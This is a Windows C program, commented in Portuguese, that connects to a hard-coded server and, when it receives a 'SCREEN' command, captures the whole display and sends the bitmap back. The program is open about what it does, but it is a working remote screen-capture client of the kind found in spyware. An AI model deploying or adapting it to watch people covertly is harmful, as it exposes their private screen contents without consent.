#include <stdio.h>    // Biblioteca padrão de entrada e saída
#include <stdlib.h>   // Biblioteca padrão de funções utilitárias
#include <string.h>   // Biblioteca para manipulação de strings
#include <winsock2.h> // Biblioteca para programação de sockets no Windows
#include <windows.h>  // Biblioteca principal da API do Windows

// Inclui as bibliotecas ws2_32.lib (sockets) e gdi32.lib (gráficos) no link
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")

// Definições de constantes
#define PORT 8080                   // Porta do servidor
#define SERVER_IP "192.168.0.115"   // IP do servidor
#define BUFFER_SIZE 4096            // Tamanho do buffer de comunicação
#define SCREEN_WIDTH 1920           // Largura da tela
#define SCREEN_HEIGHT 1080          // Altura da tela

// Função para lidar com erros, imprime a mensagem de erro e finaliza o programa
void HandleError(const char *message) {
    fprintf(stderr, "%s: %d\n", message, WSAGetLastError());
    exit(1);
}

// Função para capturar a tela e armazenar em um buffer
void CaptureScreenshot(BYTE **buffer, DWORD *size) {
    // Obtém as dimensões da tela
    int screenWidth = SCREEN_WIDTH;
    int screenHeight = SCREEN_HEIGHT;

    // Cria um contexto de dispositivo (DC) de memória compatível com a tela
    HDC hScreenDC = GetDC(NULL); // Obtém o contexto de dispositivo da tela
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC); // Cria um DC compatível na memória

    // Cria um bitmap compatível com a tela e seleciona-o no DC de memória
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight); // Cria um bitmap compatível
    SelectObject(hMemoryDC, hBitmap); // Seleciona o bitmap no DC de memória

    // Copia o conteúdo da tela para o bitmap
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY); // Realiza a cópia bit a bit

    // Configura o cabeçalho de informações do bitmap (BITMAPINFOHEADER)
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = screenWidth;
    bi.biHeight = -screenHeight;  // Negativo para indicar bitmap de cima para baixo
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // Calcula o tamanho do bitmap e aloca memória para o buffer
    DWORD dwBmpSize = ((screenWidth * bi.biBitCount + 31) / 32) * 4 * screenHeight;
    *buffer = (BYTE *)malloc(dwBmpSize);

    // Obtém os bits do bitmap
    GetDIBits(hMemoryDC, hBitmap, 0, (UINT)screenHeight, *buffer, (BITMAPINFO *)&bi, DIB_RGB_COLORS);
    *size = dwBmpSize;

    // Libera recursos
    DeleteObject(hBitmap); // Deleta o objeto bitmap
    DeleteDC(hMemoryDC);   // Deleta o contexto de dispositivo de memória
    ReleaseDC(NULL, hScreenDC); // Libera o contexto de dispositivo da tela
}


// Função principal
int main() {
    WSADATA wsaData;            // Estrutura para dados do Windows Sockets
    SOCKET clientSocket;        // Socket do cliente
    struct sockaddr_in serverAddr;  // Estrutura para endereço do servidor
    char buffer[BUFFER_SIZE];   // Buffer para comunicação
    int bytesRead;

    // Inicializa o uso do Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        HandleError("WSAStartup failed");
    }

    // Cria um socket
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        HandleError("Socket creation failed");
    }

    // Configura os parâmetros do servidor
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
    serverAddr.sin_port = htons(PORT);

    // Conecta ao servidor
    if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        HandleError("Connect failed");
    }

    printf("Connected to server\n");

    // Loop principal para receber comandos do servidor
    while (1) {
        memset(buffer, 0, BUFFER_SIZE); // Limpa o buffer
        bytesRead = recv(clientSocket, buffer, BUFFER_SIZE, 0); // Recebe dados do servidor
        if (bytesRead == SOCKET_ERROR || bytesRead == 0) {
            printf("Connection closed by server\n");
            break;
        }

        // Se o comando for "SCREEN", captura a tela e envia ao servidor
        if (strncmp(buffer, "SCREEN", 6) == 0) {
            BYTE *screenshotBuffer;
            DWORD screenshotSize;
            CaptureScreenshot(&screenshotBuffer, &screenshotSize);
            send(clientSocket, (char *)&screenshotSize, sizeof(screenshotSize), 0);
            send(clientSocket, (char *)screenshotBuffer, screenshotSize, 0);
            free(screenshotBuffer);
        } 
        
        // Se o comando for "EXIT", encerra a conexão
        else if (strncmp(buffer, "EXIT", 4) == 0) {
            printf("Exit command received\n");
            break;
        }
    }

    // Fecha o socket e limpa os recursos do Winsock
    closesocket(clientSocket);
    WSACleanup();

    return 0;
}
